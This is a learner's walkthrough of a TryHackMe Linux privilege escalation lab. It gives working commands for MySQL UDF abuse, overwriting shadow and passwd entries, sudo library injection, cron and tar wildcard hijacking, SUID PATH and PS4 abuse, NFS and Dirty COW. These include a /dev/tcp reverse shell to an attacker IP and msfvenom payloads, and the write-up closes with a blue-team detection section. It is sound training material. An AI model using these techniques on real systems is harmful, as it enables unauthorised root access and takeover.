# Linux Privilege Escalation — TryHackMe Walkthrough
**Date:** 22 September 2026 
> **Room:** Linux PrivEsc
> **Focus:** Linux Privilege Escalation / Local Privilege Escalation
> **Purpose:** Learning how a low-privileged Linux user can discover and abuse misconfigurations to obtain root privileges.

---

## 1. Introduction

Linux systems normally have different levels of access.

For example:

```text
Normal User
    ↓
Limited permissions
    ↓
Root
    ↓
Full control of the system
```

The `root` user is the most powerful user on a Linux system.

**Privilege escalation** means finding a way to move from a low-privileged account to a more powerful account.

For example:

```text
user
 ↓
root
```

This room demonstrates many different ways this can happen.

The important lesson is that privilege escalation is usually not about finding one magical command.

Instead, we:

1. Enumerate the system.
2. Look for mistakes or weaknesses.
3. Understand why the weakness exists.
4. Abuse the weakness.
5. Obtain root privileges.
6. Clean up after ourselves.

---

# 2. Lab Setup

The vulnerable machine provides an SSH service.

Connect to the machine:

```bash
ssh user@MACHINE_IP
```

Username:

```text
user
```

Password:

```text
password321
```

If SSH complains about the old RSA key algorithms:

```bash
ssh -oHostKeyAlgorithms=+ssh-rsa user@MACHINE_IP
```

After connecting, verify the current user:

```bash
whoami
```

Expected:

```text
user
```

---

# 3. What Is Privilege Escalation?

Imagine a school.

A normal student can:

* Use their desk
* Read their own books
* Complete assignments

But the principal can:

* Access every classroom
* Change school settings
* Open restricted areas

Linux works in a similar way.

A normal user has limited permissions, while `root` has almost unlimited permissions.

Privilege escalation is basically finding a mistake that allows:

```text
Student → Principal
```

or:

```text
user → root
```

---

# 4. Technique 1 — MySQL Service Exploitation

## What is the vulnerability?

The MySQL service is running as `root`.

That is dangerous because if we can make MySQL execute operating-system commands, those commands will also run as `root`.

The vulnerable MySQL installation also allows us to connect as the MySQL root user without a password.

---

## Step 1 — Navigate to the exploit directory

```bash
cd /home/user/tools/mysql-udf
```

---

## Step 2 — Compile the exploit

Compile the source code:

```bash
gcc -g -c raptor_udf2.c -fPIC
```

Then create the shared library:

```bash
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

### What happened?

We converted C source code into a shared library that MySQL can load.

---

## Step 3 — Connect to MySQL

```bash
mysql -u root
```

No password is required.

---

## Step 4 — Create the UDF

Inside MySQL:

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

We have now created a MySQL function called:

```text
do_system
```

This function allows us to execute operating-system commands.

---

## Step 5 — Create a SUID Bash shell

Run:

```sql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

This creates:

```text
/tmp/rootbash
```

and gives it the SUID permission.

---

## Step 6 — Get root

Exit MySQL:

```text
exit
```

Then:

```bash
/tmp/rootbash -p
```

Check:

```bash
whoami
```

Expected:

```text
root
```

---

## Why did this work?

The chain was:

```text
MySQL running as root
        ↓
UDF allows command execution
        ↓
Command executes as root
        ↓
Create SUID Bash
        ↓
Execute SUID Bash
        ↓
ROOT
```

---

## Cleanup

Remove the SUID shell:

```bash
rm /tmp/rootbash
```

Exit:

```bash
exit
```

---

# 5. Technique 2 — Readable `/etc/shadow`

## What is `/etc/shadow`?

Linux stores password hashes in:

```text
/etc/shadow
```

Normally, ordinary users should not be able to read it.

In this vulnerable machine, it is world-readable.

---

## Step 1 — Check permissions

```bash
ls -l /etc/shadow
```

If everyone has read permission, we have a problem.

---

## Step 2 — Read the file

```bash
cat /etc/shadow
```

We can see password hashes.

A simplified entry looks like:

```text
root:$6$HASH:...
```

The important part is the password hash.

---

## Step 3 — Copy the root hash

On Kali, save the root hash into:

```text
hash.txt
```

---

## Step 4 — Crack the hash

Using John the Ripper:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

If `rockyou.txt` is compressed:

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

---

## Step 5 — Switch to root

Once the password is discovered:

```bash
su root
```

Enter the cracked password.

Check:

```bash
whoami
```

Expected:

```text
root
```

---

## Why did this work?

The system accidentally allowed us to read something containing the root password hash.

```text
World-readable /etc/shadow
          ↓
Obtain root hash
          ↓
Crack hash
          ↓
Recover password
          ↓
su root
          ↓
ROOT
```

---

# 6. Technique 3 — Writable `/etc/shadow`

This time, `/etc/shadow` is not just readable.

It is **writable**.

That is even more dangerous.

---

## Step 1 — Check permissions

```bash
ls -l /etc/shadow
```

---

## Step 2 — Create our own password hash

```bash
mkpasswd -m sha-512 newpasswordhere
```

This produces a password hash.

---

## Step 3 — Replace the root hash

Edit:

```bash
/etc/shadow
```

Replace the existing root password hash with our new hash.

---

## Step 4 — Become root

```bash
su root
```

Use the password you selected.

---

## Why did this work?

We didn't have to crack the original password.

We simply replaced it.

```text
Writable /etc/shadow
        ↓
Change root password hash
        ↓
Know the new password
        ↓
su root
        ↓
ROOT
```

---

# 7. Technique 4 — Writable `/etc/passwd`

`/etc/passwd` contains information about Linux users.

Normally:

```text
/etc/passwd → readable
/etc/passwd → NOT writable by normal users
```

But this vulnerable machine makes it writable.

---

## Step 1 — Check permissions

```bash
ls -l /etc/passwd
```

---

## Step 2 — Generate a password hash

```bash
openssl passwd newpasswordhere
```

---

## Step 3 — Modify `/etc/passwd`

A root entry may look similar to:

```text
root:x:0:0:root:/root:/bin/bash
```

The `x` normally means the password hash is stored in `/etc/shadow`.

Replace the `x` with our generated password hash.

---

## Step 4 — Become root

```bash
su root
```

Enter the password we selected.

---

## Alternative method

We can copy the root account entry and create another account.

For example:

```text
newroot:HASH:0:0:root:/root:/bin/bash
```

The important value is:

```text
UID = 0
```

UID 0 means the account has root-level privileges.

Then:

```bash
su newroot
```

---

## Important lesson

On Linux:

```text
UID 0 = root-level privileges
```

So creating another user with UID 0 can effectively create another root account.

---

# 8. Technique 5 — Sudo Shell Escape

`sudo` allows users to execute certain programs with elevated privileges.

First check what we are allowed to run:

```bash
sudo -l
```

Example:

```text
User user may run:
    /some/program
```

Some programs have ways to escape into a shell.

---

## GTFOBins

We can research whether a permitted program has a known sudo escape.

[GTFOBins](https://gtfobins.github.io/?utm_source=chatgpt.com)

Search for the program.

If the program has a `sudo` technique, follow the documented escape.

---

## Why does this work?

Imagine we are allowed to use:

```text
Program X
```

as root.

If Program X can start another shell, then:

```text
sudo Program X
       ↓
Program X runs as root
       ↓
Program X launches shell
       ↓
Root shell
```

---

# 9. Technique 6 — Sudo Environment Variables

Environment variables are settings passed to programs.

Two important variables in this task are:

```text
LD_PRELOAD
LD_LIBRARY_PATH
```

---

## LD_PRELOAD

`LD_PRELOAD` tells Linux to load a specific shared library before other libraries.

If a vulnerable program is allowed to run with sudo and allows this variable to survive, we can potentially load our own library.

---

## Step 1 — Check sudo configuration

```bash
sudo -l
```

Look for:

```text
env_keep
```

and:

```text
LD_PRELOAD
LD_LIBRARY_PATH
```

---

## Step 2 — Compile the preload library

The room provides:

```text
/home/user/tools/sudo/preload.c
```

Compile:

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

---

## Step 3 — Execute an allowed program

Use one of the programs allowed by:

```bash
sudo -l
```

Example:

```bash
sudo LD_PRELOAD=/tmp/preload.so program-name
```

The malicious shared library is loaded.

A root shell should appear.

---

# 10. LD_LIBRARY_PATH

Another environment variable is:

```text
LD_LIBRARY_PATH
```

It controls where Linux looks for shared libraries.

---

## Step 1 — Check Apache libraries

```bash
ldd /usr/sbin/apache2
```

Look for libraries such as:

```text
libcrypt.so.1
```

---

## Step 2 — Create a malicious replacement

The room provides:

```text
/home/user/tools/sudo/library_path.c
```

Compile:

```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

---

## Step 3 — Run Apache with our library path

```bash
sudo LD_LIBRARY_PATH=/tmp apache2
```

If Apache loads our library, the code executes with elevated privileges.

---

## Big idea

```text
sudo
 ↓
Allowed program
 ↓
Program loads our shared library
 ↓
Library executes as root
 ↓
Root shell
```

---

# 11. Technique 7 — Cron Job + Writable Script

Cron is Linux's task scheduler.

It can automatically run commands:

```text
Every minute
Every hour
Every day
...
```

---

## Step 1 — Inspect cron

```bash
cat /etc/crontab
```

We find scheduled scripts.

One of them is:

```text
overwrite.sh
```

---

## Step 2 — Locate it

```bash
locate overwrite.sh
```

Then:

```bash
ls -l /usr/local/bin/overwrite.sh
```

If it is writable by our user, we can modify it.

---

## Step 3 — Replace it with a reverse shell

Change the IP address to the IP of your Kali machine.

Example:

```bash
#!/bin/bash
bash -i >& /dev/tcp/KALI_IP/4444 0>&1
```

---

## Step 4 — Start a listener on Kali

```bash
nc -nvlp 4444
```

---

## Step 5 — Wait for cron

The cron job runs automatically.

Because the cron job executes as root:

```text
Cron
 ↓
overwrite.sh
 ↓
Reverse shell
 ↓
Root shell on Kali
```

---

## Why is this dangerous?

The important combination is:

```text
Script is writable
+
Script is executed by root
```

That creates a privilege escalation vulnerability.

---

# 12. Technique 8 — Cron PATH Hijacking

This technique uses the `PATH` environment variable.

Check:

```bash
cat /etc/crontab
```

The PATH begins with:

```text
/home/user
```

That is dangerous.

---

## Why?

When Linux executes:

```bash
overwrite.sh
```

it searches directories in PATH.

If `/home/user` comes first, Linux may find:

```text
/home/user/overwrite.sh
```

before the legitimate script.

---

## Step 1 — Create our own script

Create:

```text
/home/user/overwrite.sh
```

Contents:

```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

---

## Step 2 — Make it executable

```bash
chmod +x /home/user/overwrite.sh
```

---

## Step 3 — Wait for cron

After the cron job runs:

```bash
/tmp/rootbash -p
```

Check:

```bash
whoami
```

Expected:

```text
root
```

---

## Lesson

Always be careful when a privileged process uses commands without absolute paths.

---

# 13. Technique 9 — Cron Wildcard Injection

Inspect:

```bash
cat /usr/local/bin/compress.sh
```

We discover something similar to:

```bash
tar ... *
```

The `*` is a wildcard.

Normally:

```text
*
```

means:

> "all files in this directory"

But filenames can also look like command-line options.

---

## Step 1 — Create the reverse shell

On Kali:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f elf -o shell.elf
```

Transfer it to:

```text
/home/user/
```

Make it executable:

```bash
chmod +x /home/user/shell.elf
```

---

## Step 2 — Create specially named files

```bash
touch /home/user/--checkpoint=1
```

and:

```bash
touch /home/user/--checkpoint-action=exec=shell.elf
```

---

## Why?

When the cron script executes:

```bash
tar * 
```

the shell expands:

```text
*
```

into filenames.

The filenames become:

```text
--checkpoint=1
--checkpoint-action=exec=shell.elf
```

`tar` interprets these as command-line options.

---

## Step 3 — Start listener

On Kali:

```bash
nc -nvlp 4444
```

Wait for cron.

A root shell should connect.

---

# 14. Technique 10 — SUID/SGID Known Exploit

SUID means:

> Execute a program with the permissions of the file owner.

Find SUID and SGID files:

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

We find:

```text
/usr/sbin/exim-4.84-3
```

---

## Why investigate it?

The version is old and vulnerable.

Search for an exploit matching the exact version.

The room already provides:

```text
/home/user/tools/suid/exim/cve-2016-1531.sh
```

Run:

```bash
/home/user/tools/suid/exim/cve-2016-1531.sh
```

If successful:

```text
user
 ↓
Vulnerable SUID Exim
 ↓
Known local exploit
 ↓
root
```

---

# 15. Technique 11 — SUID Shared Object Injection

The vulnerable executable is:

```text
/usr/local/bin/suid-so
```

Run it:

```bash
/usr/local/bin/suid-so
```

It normally displays a progress bar.

---

## Step 1 — Use strace

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

We discover that it tries to load:

```text
/home/user/.config/libcalc.so
```

---

## Step 2 — Create the directory

```bash
mkdir /home/user/.config
```

---

## Step 3 — Compile the malicious library

The room provides:

```text
/home/user/tools/suid/libcalc.c
```

Compile:

```bash
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

---

## Step 4 — Run the SUID program

```bash
/usr/local/bin/suid-so
```

The program loads our library.

Because the original program is SUID:

```text
SUID program
 ↓
Loads our library
 ↓
Library runs with elevated privileges
 ↓
Root shell
```

---

# 16. Technique 12 — SUID PATH Hijacking

The vulnerable program is:

```text
/usr/local/bin/suid-env
```

Run:

```bash
/usr/local/bin/suid-env
```

It attempts to start Apache.

---

## Step 1 — Inspect strings

```bash
strings /usr/local/bin/suid-env
```

We discover:

```text
service apache2 start
```

The program uses:

```text
service
```

instead of:

```text
/usr/sbin/service
```

This means PATH can influence which `service` executable is found.

---

## Step 2 — Create our fake service

Compile:

```bash
gcc -o service /home/user/tools/suid/service.c
```

The provided program launches Bash.

---

## Step 3 — Modify PATH

```bash
PATH=.:$PATH /usr/local/bin/suid-env
```

Now Linux searches the current directory first.

It finds our malicious:

```text
./service
```

instead of the legitimate service program.

---

## Result

```text
SUID program
 ↓
service command
 ↓
PATH finds our fake service
 ↓
Fake service launches shell
 ↓
ROOT
```

---

# 17. Technique 13 — Bash Function Hijacking

The next program is:

```text
/usr/local/bin/suid-env2
```

Check:

```bash
strings /usr/local/bin/suid-env2
```

This version uses the absolute path:

```text
/usr/sbin/service
```

So ordinary PATH hijacking does not work.

However, this old Bash version has another weakness.

---

## Step 1 — Check Bash version

```bash
/bin/bash --version
```

The technique works on vulnerable older Bash versions.

---

## Step 2 — Create a function

```bash
function /usr/sbin/service { /bin/bash -p; }
```

Export it:

```bash
export -f /usr/sbin/service
```

---

## Step 3 — Run the SUID program

```bash
/usr/local/bin/suid-env2
```

The shell function can replace the expected command.

Result:

```text
Root shell
```

---

# 18. Technique 14 — Bash Debugging / PS4

Bash debugging can display commands using:

```text
PS4
```

The vulnerable program is again:

```text
/usr/local/bin/suid-env2
```

This technique does not work on modern Bash versions such as Bash 4.4+.

---

## Step 1 — Run the exploit

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

The command creates:

```text
/tmp/rootbash
```

with SUID permissions.

---

## Step 2 — Execute it

```bash
/tmp/rootbash -p
```

Check:

```bash
whoami
```

Expected:

```text
root
```

---

## Cleanup

```bash
rm /tmp/rootbash
exit
```

---

# 19. Technique 15 — Passwords in History Files

Users sometimes accidentally type passwords directly into commands.

For example:

```bash
mysql -u root -pPassword123
```

Instead of:

```bash
mysql -u root -p
```

The first command can expose the password in shell history.

---

## Step 1 — Search history

```bash
cat ~/.*history | less
```

Look for commands containing:

```text
password
passwd
-p
```

We find credentials for the root account.

---

## Step 2 — Become root

```bash
su root
```

Enter the discovered password.

---

## Lesson

Command history can contain sensitive information.

A password should normally be entered through a password prompt rather than directly in the command.

---

# 20. Technique 16 — Credentials in Configuration Files

Configuration files frequently contain:

* Passwords
* API keys
* VPN credentials
* Database credentials
* Private keys

List the user's home directory:

```bash
ls /home/user
```

We find:

```text
myvpn.ovpn
```

---

## Step 1 — Read the configuration

```bash
cat /home/user/myvpn.ovpn
```

The configuration points toward the location containing root credentials.

---

## Step 2 — Use the credentials

```bash
su root
```

Enter the discovered credentials.

---

## Lesson

Configuration files should not expose sensitive credentials to users who should not have access to them.

---

# 21. Technique 17 — SSH Private Key

SSH private keys can be used instead of passwords.

We look for hidden files:

```bash
ls -la /
```

We discover:

```text
/.ssh
```

---

## Step 1 — Inspect the directory

```bash
ls -l /.ssh
```

We find:

```text
root_key
```

---

## Step 2 — Read the key

```bash
cat /.ssh/root_key
```

The file is a private SSH key.

---

## Step 3 — Copy it to Kali

Save it as:

```text
root_key
```

Set secure permissions:

```bash
chmod 600 root_key
```

---

## Step 4 — SSH as root

Because the machine uses old SSH algorithms:

```bash
ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@MACHINE_IP
```

---

## Why did this work?

We obtained the private key belonging to root.

Therefore:

```text
Root private key
      ↓
SSH authentication
      ↓
root account
```

---

# 22. Technique 18 — NFS Root Squashing

NFS allows directories to be shared across machines.

One important security feature is:

```text
root squashing
```

Root squashing prevents a remote root user from becoming root on the NFS server.

But this machine has root squashing disabled for `/tmp`.

---

## Step 1 — Inspect NFS configuration

On the Debian machine:

```bash
cat /etc/exports
```

We find:

```text
/tmp
```

with root squashing disabled.

---

## Step 2 — Become root on Kali

```bash
sudo su
```

---

## Step 3 — Mount the NFS share

```bash
mkdir /tmp/nfs
```

Then:

```bash
mount -o rw,vers=3 MACHINE_IP:/tmp /tmp/nfs
```

---

## Step 4 — Create a SUID shell payload

Generate the payload:

```bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

---

## Step 5 — Set SUID

```bash
chmod +xs /tmp/nfs/shell.elf
```

Because root squashing is disabled, the file can retain root ownership/privileges through the NFS share.

---

## Step 6 — Execute from Debian

On the Debian machine:

```bash
/tmp/shell.elf
```

A root shell should appear.

---

## Attack chain

```text
NFS share
 ↓
Root squashing disabled
 ↓
Kali root creates SUID file
 ↓
File appears on Debian
 ↓
Low-privileged user executes it
 ↓
ROOT
```

---

# 23. Technique 19 — Kernel Exploitation

Kernel exploits should generally be considered a **last resort**.

Why?

Because exploiting the kernel can:

* Crash the machine
* Make the system unstable
* Corrupt data

---

## Step 1 — Run Linux Exploit Suggester

```bash
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
```

The tool identifies possible kernel vulnerabilities.

One of the listed vulnerabilities is:

```text
Dirty COW
```

---

## Step 2 — Locate the exploit

The room provides:

```text
/home/user/tools/kernel-exploits/dirtycow/c0w.c
```

---

## Step 3 — Compile it

```bash
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
```

---

## Step 4 — Run the exploit

```bash
./c0w
```

This may take several minutes.

The exploit modifies:

```text
/usr/bin/passwd
```

and creates a backup:

```text
/tmp/bak
```

---

## Step 5 — Execute passwd

```bash
/usr/bin/passwd
```

The modified program provides a root shell.

---

## Step 6 — Restore the original file

Very important:

```bash
mv /tmp/bak /usr/bin/passwd
```

Then:

```bash
exit
```

---

# 24. Technique 20 — Privilege Escalation Enumeration Scripts

Manual enumeration can take a long time.

There are tools designed to automate privilege escalation checks.

The room provides several scripts here:

```text
/home/user/tools/privesc-scripts
```

These tools examine the system for things such as:

* SUID files
* Writable files
* Weak permissions
* Cron jobs
* Interesting processes
* Passwords
* Environment variables
* Kernel versions
* Services
* Configuration mistakes

---

## Important lesson

Automated tools are useful, but you should understand what they are finding.

For example:

```text
Tool says:
/etc/shadow is writable
```

You should understand:

```text
Why is that dangerous?
What can I do with it?
Why does it lead to root?
```

The goal is not simply:

```text
Run tool → copy exploit
```

The goal is:

```text
Enumerate → Understand → Verify → Exploit
```

---

# 25. The Main Privilege Escalation Categories

After completing this room, I noticed that most techniques fall into a few major categories.

## 1. Weak Permissions

Examples:

```text
/etc/shadow readable
/etc/shadow writable
/etc/passwd writable
Writable scripts
```

---

## 2. Sudo Misconfiguration

Examples:

```text
sudo -l
LD_PRELOAD
LD_LIBRARY_PATH
Shell escapes
```

---

## 3. Cron Misconfiguration

Examples:

```text
Writable cron script
PATH hijacking
Wildcard injection
```

---

## 4. SUID / SGID Problems

Examples:

```text
Known vulnerable SUID program
Shared object injection
PATH hijacking
Shell feature abuse
```

---

## 5. Credential Exposure

Examples:

```text
History files
Configuration files
SSH private keys
```

---

## 6. Network Share Misconfiguration

Example:

```text
NFS with root squashing disabled
```

---

## 7. Vulnerable Software

Examples:

```text
Old Exim
Vulnerable MySQL
```

---

## 8. Kernel Vulnerabilities

Example:

```text
Dirty COW
```

---

# 26. The Enumeration Mindset

When I get access to a Linux machine as a low-privileged user, I should not immediately start running random exploits.

I should first ask:

### Who am I?

```bash
whoami
id
```

### What operating system is this?

```bash
uname -a
cat /etc/os-release
```

### What can I run with sudo?

```bash
sudo -l
```

### What SUID files exist?

```bash
find / -perm -4000 -type f 2>/dev/null
```

### What is running?

```bash
ps aux
```

### What services are running?

```bash
ss -tulpn
```

### What cron jobs exist?

```bash
cat /etc/crontab
```

### What files can I write to?

Look for:

```text
Writable scripts
Writable configuration files
Writable directories
```

### Are credentials exposed?

Check:

```text
History
Configuration files
SSH keys
Application files
```

---

# 27. A Simple Privilege Escalation Checklist

When I receive a Linux shell, I can use this checklist:

```text
[ ] whoami
[ ] id
[ ] uname -a
[ ] cat /etc/os-release

[ ] sudo -l

[ ] Find SUID files
[ ] Find SGID files

[ ] Check /etc/passwd
[ ] Check /etc/shadow

[ ] Check cron jobs
[ ] Check writable cron scripts
[ ] Check PATH

[ ] Check running processes
[ ] Check network services

[ ] Search configuration files
[ ] Search history files
[ ] Search for passwords

[ ] Check SSH keys
[ ] Check NFS
[ ] Check installed software

[ ] Check kernel version

[ ] Use enumeration scripts
```

---

# 28. Important Concepts I Learned

## SUID

SUID allows a program to execute with the permissions of its owner.

If a root-owned SUID program is vulnerable:

```text
Normal User
    ↓
SUID Program
    ↓
Root privileges
```

---

## SGID

SGID is similar, but relates to group privileges.

---

## PATH

`PATH` tells Linux where to look for commands.

For example:

```text
PATH=/home/user:/usr/bin:/bin
```

Linux checks:

```text
/home/user
```

before:

```text
/usr/bin
```

This can become dangerous when privileged programs use commands without absolute paths.

---

## `/etc/passwd`

Contains account information.

Important field:

```text
UID
```

UID:

```text
0 = root
```

---

## `/etc/shadow`

Contains password hashes.

It should normally be protected from ordinary users.

---

## Cron

Cron automatically executes scheduled commands.

A root cron job that runs a user-writable script can lead to privilege escalation.

---

## Sudo

Sudo allows selected commands to execute with elevated privileges.

Always check:

```bash
sudo -l
```

---

## Environment Variables

Variables such as:

```text
PATH
LD_PRELOAD
LD_LIBRARY_PATH
PS4
```

can influence how programs execute.

If a privileged program handles them unsafely, they may provide a privilege escalation path.

---

## NFS

NFS allows directories to be shared over a network.

Security options such as root squashing are important because they prevent remote root users from automatically being treated as root on the server.

---

# 29. The General Attack Chain

The biggest lesson from this room is that privilege escalation usually follows this pattern:

```text
        Initial Access
              ↓
        Low Privileged User
              ↓
          Enumeration
              ↓
      Find Misconfiguration
              ↓
       Understand Weakness
              ↓
        Choose Technique
              ↓
          Exploitation
              ↓
        Root Privileges
              ↓
           Cleanup
```

---

# 30. Blue Team Perspective

As someone learning SOC/Blue Team security, I should also understand how these attacks can be detected.

For example:

### Suspicious SUID activity

Monitor for:

```text
Unexpected SUID files
Changes to permissions
New executable files
```

### Suspicious cron modifications

Monitor:

```text
Changes to /etc/crontab
Changes to cron scripts
Unexpected reverse shells
```

### Suspicious `/etc/passwd` or `/etc/shadow` changes

Monitor:

```text
File modifications
Permission changes
Unexpected account creation
UID 0 accounts
```

### Suspicious shared libraries

Monitor:

```text
Unexpected .so files
LD_PRELOAD usage
LD_LIBRARY_PATH manipulation
```

### Credential exposure

Look for:

```text
Passwords in command lines
Private SSH keys with weak permissions
Credentials inside configuration files
```

### Kernel exploitation

Look for:

```text
Unexpected crashes
Suspicious memory-related activity
Abnormal process behavior
Unexpected modifications to system binaries
```

---

# 31. What I Learned From This Room

This room taught me that Linux privilege escalation is heavily based on **misconfiguration and enumeration**.

The most important thing I learned was not a particular exploit.

It was the process:

```text
Enumerate
   ↓
Identify
   ↓
Understand
   ↓
Exploit
   ↓
Verify
   ↓
Clean up
```

I also learned how seemingly small configuration mistakes can become serious security vulnerabilities.

For example:

```text
Writable file
```

may look harmless.

But if:

```text
Root executes that file
```

then the situation becomes:

```text
Writable file
      +
Root execution
      =
Privilege Escalation
```

---

# 32. Final Takeaway

Linux privilege escalation is about understanding how permissions, processes, files, services, scheduled tasks, environment variables, credentials, and software interact.

The most important questions I should ask during enumeration are:

> **What can I control?**

> **What does root control?**

> **Is there something root executes that I can influence?**

That mindset is more valuable than memorizing individual exploits.

---

## Techniques Covered

| #  | Technique                    | Main Weakness                      |
| -- | ---------------------------- | ---------------------------------- |
| 1  | MySQL UDF                    | MySQL running as root              |
| 2  | Readable `/etc/shadow`       | Weak file permissions              |
| 3  | Writable `/etc/shadow`       | Weak file permissions              |
| 4  | Writable `/etc/passwd`       | Weak file permissions              |
| 5  | Sudo shell escapes           | Sudo misconfiguration              |
| 6  | `LD_PRELOAD`                 | Dangerous environment inheritance  |
| 7  | `LD_LIBRARY_PATH`            | Shared-library hijacking           |
| 8  | Cron writable script         | Weak file permissions              |
| 9  | Cron PATH hijacking          | Unsafe PATH                        |
| 10 | Cron wildcard injection      | Unsafe wildcard usage              |
| 11 | SUID Exim exploit            | Vulnerable software                |
| 12 | SUID shared object injection | Unsafe library loading             |
| 13 | SUID PATH hijacking          | Unsafe command lookup              |
| 14 | Bash function abuse          | Vulnerable Bash behavior           |
| 15 | Bash PS4 abuse               | Vulnerable Bash debugging behavior |
| 16 | History files                | Exposed credentials                |
| 17 | Configuration files          | Plaintext credentials              |
| 18 | SSH private key              | Weak key permissions               |
| 19 | NFS                          | Root squashing disabled            |
| 20 | Kernel exploit               | Vulnerable kernel                  |
| 21 | Enumeration scripts          | Automated discovery                |

---
